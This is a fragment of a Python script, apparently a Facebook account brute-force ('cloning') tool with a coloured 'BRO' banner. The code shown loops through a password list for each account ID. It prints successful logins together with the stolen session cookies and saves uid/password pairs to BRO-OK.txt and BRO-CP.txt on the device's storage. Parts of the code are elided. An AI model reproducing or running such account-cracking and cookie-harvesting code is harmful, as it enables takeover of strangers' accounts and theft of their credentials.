...
{warna}--------------------------------------------{B}
 ...
 Tools   : B{C}/{B}R{C}/{B}O{M} •{warna}[{H}TRAIL{warna}]{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[BRO-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/BRO-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[BRO-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/BRO-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
